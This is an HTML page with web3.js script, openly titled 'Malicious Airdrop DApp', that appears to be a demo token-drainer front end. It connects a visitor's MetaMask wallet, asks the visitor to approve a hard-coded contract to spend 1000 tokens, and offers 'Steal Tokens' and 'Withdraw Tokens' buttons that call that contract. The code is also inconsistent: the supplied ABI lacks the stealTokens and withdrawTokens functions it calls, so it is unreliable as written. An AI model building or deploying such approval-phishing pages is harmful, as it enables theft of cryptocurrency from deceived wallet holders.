<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Malicious Airdrop DApp</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.3/dist/web3.min.js"></script>
</head>
<body>
    <h1>Malicious Airdrop DApp</h1>
    
    <button id="connectButton">Connect MetaMask</button>
    <button id="approveButton" style="display:none;">Approve Contract</button>
    <button id="stealButton" style="display:none;">Steal Tokens</button>
    <button id="withdrawButton" style="display:none;">Withdraw Tokens</button>
    
    <script>
        let web3;
        let contract;
        let accounts;
        let contractAddress = "0xEDd1061AC707dcE56B48B77a700D75CD51f261cf";  // Malicious contract address
        let tokenAddress = "0x1dD71aCdc4091d8de461e46C8F142A7F32BEE9F4";  // TKK token address
        let contractABI = [
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "spender",
                        "type": "address"
                    },
                    {
                        "internalType": "uint256",
                        "name": "amount",
                        "type": "uint256"
                    }
                ],
                "name": "approve",
                "outputs": [
                    {
                        "internalType": "bool",
                        "name": "",
                        "type": "bool"
                    }
                ],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "account",
                        "type": "address"
                    }
                ],
                "name": "balanceOf",
                "outputs": [
                    {
                        "internalType": "uint256",
                        "name": "",
                        "type": "uint256"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "recipient",
                        "type": "address"
                    },
                    {
                        "internalType": "uint256",
                        "name": "amount",
                        "type": "uint256"
                    }
                ],
                "name": "transfer",
                "outputs": [
                    {
                        "internalType": "bool",
                        "name": "",
                        "type": "bool"
                    }
                ],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "sender",
                        "type": "address"
                    },
                    {
                        "internalType": "address",
                        "name": "recipient",
                        "type": "address"
                    },
                    {
                        "internalType": "uint256",
                        "name": "amount",
                        "type": "uint256"
                    }
                ],
                "name": "transferFrom",
                "outputs": [
                    {
                        "internalType": "bool",
                        "name": "",
                        "type": "bool"
                    }
                ],
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ];

        // Connect to MetaMask and Web3
        async function connectMetaMask() {
            if (window.ethereum) {
                web3 = new Web3(window.ethereum);
                await window.ethereum.request({ method: "eth_requestAccounts" });
                accounts = await web3.eth.getAccounts();
                contract = new web3.eth.Contract(contractABI, contractAddress);
                document.getElementById("approveButton").style.display = "block";
                document.getElementById("stealButton").style.display = "block";
                document.getElementById("withdrawButton").style.display = "block";
            } else {
                alert("Please install MetaMask!");
            }
        }

        // Approve the contract to transfer tokens
        async function approveContract() {
            const amount = web3.utils.toWei("1000", "ether"); // For testing, approve 1000 tokens
            const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
            await tokenContract.methods.approve(contractAddress, amount).send({ from: accounts[0] });
            alert("Approval Successful");
        }

        // Steal Tokens
        async function stealTokens() {
            await contract.methods.stealTokens().send({ from: accounts[0] });
            alert("Tokens stolen successfully");
        }

        // Withdraw Tokens
        async function withdrawTokens() {
            await contract.methods.withdrawTokens().send({ from: accounts[0] });
            alert("Tokens withdrawn successfully");
        }

        // Add event listeners to buttons
        document.getElementById("connectButton").addEventListener("click", connectMetaMask);
        document.getElementById("approveButton").addEventListener("click", approveContract);
        document.getElementById("stealButton").addEventListener("click", stealTokens);
        document.getElementById("withdrawButton").addEventListener("click", withdrawTokens);
    </script>
</body>
</html>


     






   

 

